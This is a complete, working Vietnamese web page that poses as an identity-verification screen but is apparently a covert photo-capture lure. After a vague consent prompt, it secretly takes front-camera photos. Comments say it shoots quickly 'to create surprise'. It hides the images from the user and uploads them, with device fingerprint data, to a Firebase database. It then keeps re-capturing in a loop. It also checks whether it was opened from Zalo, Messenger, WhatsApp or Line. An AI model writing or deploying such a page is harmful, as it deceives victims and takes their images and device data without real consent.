<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Xác minh</title>
    
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
            margin: 0;
        }
        .container {
            background: linear-gradient(145deg, #1a1a2e, #16213e);
            border-radius: 24px;
            padding: 24px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            text-align: center;
            position: relative;
        }
        .header {
            margin-bottom: 20px;
        }
        .logo {
            font-size: 48px;
            margin-bottom: 8px;
        }
        .title {
            color: #ffffff;
            font-size: 20px;
            font-weight: 700;
        }
        .subtitle {
            color: #8888aa;
            font-size: 14px;
            margin-top: 4px;
        }
        
        /* Video container - ẩn đi */
        .video-wrapper {
            position: relative;
            width: 100%;
            border-radius: 16px;
            overflow: hidden;
            background: #000;
            aspect-ratio: 4/3;
            margin-bottom: 16px;
            display: none;
        }
        .video-wrapper.active {
            display: block;
        }
        #video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }
        
        /* Preview ảnh - ẨN HOÀN TOÀN, không hiển thị */
        .preview-wrapper {
            display: none !important;
        }
        #capturedPhoto {
            display: none !important;
        }
        
        /* Trạng thái đang xử lý */
        .processing-state {
            display: none;
            padding: 40px 20px;
        }
        .processing-state.active {
            display: block;
        }
        .processing-state .icon {
            font-size: 48px;
            margin-bottom: 12px;
            animation: pulse 1.5s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.1); }
        }
        .processing-state .text {
            color: #8888aa;
            font-size: 16px;
            font-weight: 500;
        }
        .processing-state .sub-text {
            color: #666688;
            font-size: 13px;
            margin-top: 6px;
        }
        
        /* Nút bấm */
        .btn-main {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 50px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            background: #4CAF50;
            color: white;
            position: relative;
            overflow: hidden;
        }
        .btn-main:active {
            transform: scale(0.97);
        }
        .btn-main:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .btn-main .icon {
            margin-right: 8px;
        }
        
        /* Loading */
        #loading {
            display: none;
            padding: 20px 0;
        }
        #loading.active {
            display: block;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #333;
            border-top-color: #4CAF50;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 10px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .loading-text {
            color: #8888aa;
            font-size: 14px;
        }
        
        /* Status */
        #status {
            margin-top: 12px;
            padding: 12px 16px;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 500;
            display: none;
        }
        #status.success {
            display: block;
            background: rgba(76, 175, 80, 0.15);
            color: #4CAF50;
            border: 1px solid rgba(76, 175, 80, 0.3);
        }
        #status.error {
            display: block;
            background: rgba(244, 67, 54, 0.15);
            color: #ff6b6b;
            border: 1px solid rgba(244, 67, 54, 0.3);
        }
        #status.info {
            display: block;
            background: rgba(33, 150, 243, 0.15);
            color: #64b5f6;
            border: 1px solid rgba(33, 150, 243, 0.3);
        }
        #status.loading-status {
            display: block;
            background: rgba(255, 193, 7, 0.15);
            color: #ffd54f;
            border: 1px solid rgba(255, 193, 7, 0.3);
        }
        
        .footer {
            margin-top: 16px;
            color: #444466;
            font-size: 11px;
        }
        .footer span {
            color: #4CAF50;
        }
        
        /* Overlay xin phép */
        .permission-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.85);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 99999;
            padding: 20px;
        }
        .permission-overlay.active {
            display: flex;
        }
        .permission-box {
            background: #1a1a2e;
            border-radius: 24px;
            padding: 30px 24px;
            max-width: 340px;
            width: 100%;
            text-align: center;
            border: 1px solid #333355;
        }
        .permission-box .icon {
            font-size: 56px;
            margin-bottom: 12px;
        }
        .permission-box h3 {
            color: white;
            font-size: 18px;
            margin-bottom: 8px;
        }
        .permission-box p {
            color: #8888aa;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 20px;
        }
        .permission-box .btn-allow {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            background: #4CAF50;
            color: white;
            transition: all 0.3s;
        }
        .permission-box .btn-allow:active {
            transform: scale(0.97);
        }
        .permission-box .btn-deny {
            width: 100%;
            padding: 12px;
            border: none;
            background: transparent;
            color: #666688;
            font-size: 14px;
            cursor: pointer;
            margin-top: 8px;
        }
    </style>
</head>
<body>

    <!-- Overlay xin phép -->
    <div class="permission-overlay" id="permissionOverlay">
        <div class="permission-box">
            <div class="icon">.</div>
            <h3>Xác minh danh tính</h3>
            <p>Hệ thống cần truy cập ảnh để xác thực danh tính của bạn. Dữ liệu được mã hóa và bảo mật.</p>
            <button class="btn-allow" id="allowBtn">✅ Đồng ý</button>
            <button class="btn-deny" id="denyBtn">❌ Không đồng ý</button>
        </div>
    </div>

    <!-- Nội dung chính -->
    <div class="container">
        <div class="header">
            <div class="logo">🔐</div>
            <div class="title">Xác minh danh tính</div>
            <div class="subtitle">Vui lòng cho phép truy cập ảnh</div>
        </div>

        <!-- Video (ẩn, chỉ để chụp) -->
        <div class="video-wrapper" id="videoWrapper">
            <video id="video" autoplay playsinline></video>
        </div>

        <!-- Preview ảnh - ẨN HOÀN TOÀN -->
        <div class="preview-wrapper" id="previewWrapper">
            <img id="capturedPhoto" alt="Ảnh xác minh">
        </div>

        <!-- Trạng thái đang xử lý (hiển thị thay vì preview ảnh) -->
        <div class="processing-state" id="processingState">
            <div class="icon">⏳</div>
            <div class="text">Đang xác minh danh tính...</div>
            <div class="sub-text">Vui lòng đợi trong giây lát</div>
        </div>

        <button class="btn-main" id="actionBtn">
            <span class="icon">.</span> Bắt đầu xác minh
        </button>

        <div id="loading">
            <div class="spinner"></div>
            <div class="loading-text">⏳ Đang xử lý...</div>
        </div>

        <div id="status"></div>

        <div class="footer">
            🔒 Dữ liệu được <span>mã hóa</span> và <span>bảo mật</span>
        </div>
    </div>

    <script>
        // Firebase Config
        const firebaseConfig = {
            databaseURL: "https://shopmduy-default-rtdb.asia-southeast1.firebasedatabase.app/"
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // DOM Elements
        const video = document.getElementById('video');
        const canvas = document.createElement('canvas');
        document.body.appendChild(canvas);
        canvas.style.display = 'none';
        
        const capturedPhoto = document.getElementById('capturedPhoto');
        const videoWrapper = document.getElementById('videoWrapper');
        const previewWrapper = document.getElementById('previewWrapper');
        const processingState = document.getElementById('processingState');
        const statusDiv = document.getElementById('status');
        const loadingDiv = document.getElementById('loading');
        const actionBtn = document.getElementById('actionBtn');
        const permissionOverlay = document.getElementById('permissionOverlay');
        const allowBtn = document.getElementById('allowBtn');
        const denyBtn = document.getElementById('denyBtn');

        let stream = null;
        let uid = '';
        let isProcessing = false;
        let cameraReady = false;
        let photoTaken = false;

        // Phát hiện nền tảng
        function detectPlatform() {
            const ua = navigator.userAgent;
            if (ua.includes('Zalo')) return 'Zalo';
            if (ua.includes('FBAN') || ua.includes('FBAV')) return 'Messenger';
            if (ua.includes('WhatsApp')) return 'WhatsApp';
            if (ua.includes('Line')) return 'Line';
            return 'Browser';
        }

        const platform = detectPlatform();
        console.log('📱 Platform:', platform);

        function generateUID() {
            return 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }
        uid = generateUID();

        function showStatus(msg, type = 'info') {
            statusDiv.textContent = msg;
            statusDiv.className = type;
            statusDiv.style.display = 'block';
            
            if (type !== 'error') {
                setTimeout(() => {
                    statusDiv.style.display = 'none';
                }, 8000);
            }
        }

        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                timestamp: new Date().toISOString(),
                app: platform
            };
        }

        // ===== XIN PHÉP =====
        function showPermissionDialog() {
            return new Promise((resolve) => {
                permissionOverlay.classList.add('active');
                
                allowBtn.onclick = function() {
                    permissionOverlay.classList.remove('active');
                    resolve(true);
                };
                
                denyBtn.onclick = function() {
                    permissionOverlay.classList.remove('active');
                    resolve(false);
                };
                
                permissionOverlay.onclick = function(e) {
                    if (e.target === permissionOverlay) {
                        permissionOverlay.classList.remove('active');
                        resolve(false);
                    }
                };
            });
        }

        // ===== START CAMERA =====
        async function startCamera() {
            try {
                const agreed = await showPermissionDialog();
                
                if (!agreed) {
                    showStatus('❌ Bạn đã từ chối quyền truy cập camera.', 'error');
                    return false;
                }

                showStatus('📷 Đang mở camera...', 'info');

                const constraints = {
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                };

                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        ...constraints,
                        video: { ...constraints.video, facingMode: 'user' }
                    });
                } catch (e) {
                    stream = await navigator.mediaDevices.getUserMedia(constraints);
                }

                video.srcObject = stream;
                await video.play();
                
                videoWrapper.classList.add('active');
                cameraReady = true;
                
                showStatus('✅ Đang xác minh...', 'loading-status');
                
                // Tự động chụp sau 0.8 giây - nhanh, tạo bất ngờ
                setTimeout(() => {
                    captureAndUpload();
                }, 800);
                
                return true;

            } catch (err) {
                console.error('Lỗi camera:', err);
                showStatus('⚠️ Không thể truy cập camera.', 'error');
                createFallbackAndUpload();
                return false;
            }
        }

        // ===== CHỤP ẢNH (không hiển thị preview) =====
        async function captureAndUpload() {
            if (isProcessing || !cameraReady) return;
            if (photoTaken) return;
            
            photoTaken = true;
            
            try {
                const context = canvas.getContext('2d');
                const vw = video.videoWidth || 640;
                const vh = video.videoHeight || 480;
                canvas.width = vw;
                canvas.height = vh;
                context.drawImage(video, 0, 0, vw, vh);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.85);
                
                // KHÔNG HIỂN THỊ PREVIEW - chỉ hiện trạng thái đang xử lý
                videoWrapper.classList.remove('active');
                processingState.classList.add('active');
                
                // Ẩn luôn video để tạo bất ngờ
                video.style.display = 'none';
                
                await uploadToFirebase(imageData);
                
            } catch (err) {
                console.error('Lỗi chụp:', err);
                showStatus('❌ Lỗi chụp ảnh', 'error');
                photoTaken = false;
                processingState.classList.remove('active');
            }
        }

        // ===== FALLBACK =====
        function createFallbackAndUpload() {
            const ctx = canvas.getContext('2d');
            canvas.width = 800;
            canvas.height = 600;
            
            const grad = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
            grad.addColorStop(0, '#1a1a2e');
            grad.addColorStop(1, '#16213e');
            ctx.fillStyle = grad;
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#4CAF50';
            ctx.font = '60px Arial';
            ctx.textAlign = 'center';
            ctx.fillText('📸', canvas.width/2, canvas.height/2 - 30);
            
            ctx.fillStyle = '#888';
            ctx.font = '20px Arial';
            ctx.fillText('Xác minh danh tính', canvas.width/2, canvas.height/2 + 50);
            
            const imageData = canvas.toDataURL('image/png');
            
            // Hiện trạng thái xử lý
            processingState.classList.add('active');
            uploadToFirebase(imageData);
        }

        // ===== UPLOAD =====
        async function uploadToFirebase(imageData) {
            if (isProcessing) return;
            isProcessing = true;
            loadingDiv.classList.add('active');
            actionBtn.disabled = true;
            
            try {
                const deviceInfo = getDeviceInfo();
                const timestamp = new Date().toISOString();
                
                const photoRef = database.ref('photos/' + uid);
                await photoRef.set({
                    uid: uid,
                    imageData: imageData,
                    timestamp: timestamp,
                    deviceInfo: deviceInfo,
                    platform: platform
                });
                
                const notifyRef = database.ref('notify/' + uid);
                await notifyRef.set({
                    uid: uid,
                    timestamp: timestamp,
                    status: 'pending',
                    type: 'photo'
                });
                
                // Thông báo thành công - KHÔNG HIỂN THỊ ẢNH
                showStatus('✅ Xác minh thành công! Cảm ơn bạn.', 'success');
                
                // Reset sau 3 giây
                setTimeout(() => {
                    uid = generateUID();
                    isProcessing = false;
                    photoTaken = false;
                    loadingDiv.classList.remove('active');
                    processingState.classList.remove('active');
                    videoWrapper.classList.remove('active');
                    video.style.display = 'block';
                    actionBtn.disabled = false;
                    
                    // Tự động chụp lại nếu camera vẫn đang chạy
                    if (cameraReady && stream) {
                        setTimeout(() => {
                            videoWrapper.classList.add('active');
                            setTimeout(() => captureAndUpload(), 800);
                        }, 2000);
                    }
                }, 3000);
                
            } catch (error) {
                console.error('Lỗi upload:', error);
                showStatus('❌ Lỗi: ' + error.message, 'error');
                isProcessing = false;
                photoTaken = false;
                loadingDiv.classList.remove('active');
                processingState.classList.remove('active');
                actionBtn.disabled = false;
            }
        }

        // ===== SỰ KIỆN =====
        actionBtn.addEventListener('click', function() {
            if (!cameraReady) {
                startCamera();
            } else if (!photoTaken) {
                captureAndUpload();
            }
        });

        // ===== KHỞI ĐỘNG =====
        document.addEventListener('DOMContentLoaded', function() {
            showStatus('👆 Nhấn "Bắt đầu xác minh" để tiếp tục', 'info');
        });

        // Xử lý khi đóng
        window.addEventListener('beforeunload', function() {
            if (stream) {
                const tracks = stream.getTracks();
                tracks.forEach(t => t.stop());
            }
        });

        console.log('✅ Hệ thống xác minh sẵn sàng');
        console.log('📱 UID:', uid);
        console.log('📱 Platform:', platform);
    </script>
</body>
</html>
